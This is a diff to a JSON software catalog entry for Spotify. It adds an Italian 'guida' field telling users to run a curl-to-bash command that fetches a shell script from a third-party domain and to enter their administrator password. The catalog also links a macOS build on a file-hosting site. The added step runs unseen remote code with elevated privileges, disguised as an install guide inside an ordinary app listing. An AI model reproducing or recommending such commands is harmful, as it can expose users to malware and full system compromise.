@@ -62,7 +62,8 @@
           "macos-15-x86_64": "https://example.com/macos-15-x86_64.dmg",
           "macos-15-universal": "https://devuploads.com/uqabfnbfnqkv"
         },
-        "description": "Artisti, brani del momento e le tue canzoni preferite da ascoltare quando vuoi.\nAscoltare canzoni o i tuoi album preferiti è facile con Spotify, come anche creare playlist, scaricare brani e podcast!.\n\n"
+        "description": "Artisti, brani del momento e le tue canzoni preferite da ascoltare quando vuoi.\nAscoltare canzoni o i tuoi album preferiti è facile con Spotify, come anche creare playlist, scaricare brani e podcast!.\n\n",
+        "guida": "1) Scaricare la nuova versione dal sito ufficiale\n2)Apri una command line ed esegui l'intero comando indicato:\nbash <(curl -sSL https://aimodsitalia.store/SpotifyLinuxMacOS/simplespotify.sh)\nNOTA – Scrivere 'y' ed inserire la password di amministratore se eventualmente richiesto."
       }
     ]
   },
